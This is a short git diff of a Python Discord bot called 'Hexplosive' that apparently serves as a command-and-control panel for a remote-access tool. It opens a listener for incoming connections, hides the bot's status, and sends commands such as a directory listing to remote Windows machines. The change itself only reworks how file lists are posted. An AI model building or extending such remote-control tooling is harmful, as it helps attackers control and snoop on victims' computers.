@@ -35,6 +35,7 @@ bot = commands.Bot(command_prefix="hexp ", intents=discord.Intents.all())
 async def on_ready():
     print("Hexplosive server is running... ;)")
     global myListener
+    
     myListener = Listener("0.0.0.0", 0000)
     await bot.change_presence(status=discord.Status.offline)
     await myListener.listen_for_connections()
@@ -585,8 +586,10 @@ async def get_dir(ctx):
         output = await myListener.execute_remotely(channel_name, "getdirhash")
         if isinstance(output, list):
             await ctx.send("[+] List of Files in `C:/Program Files`:")
+            file_list = ""
             for file in output:
-                await ctx.send(file)
+                file_list += file + "\n"
+                await ctx.reply(file_list)                
             return
     except Exception as e:
         await ctx.reply(f"An error occurred: {e}")  
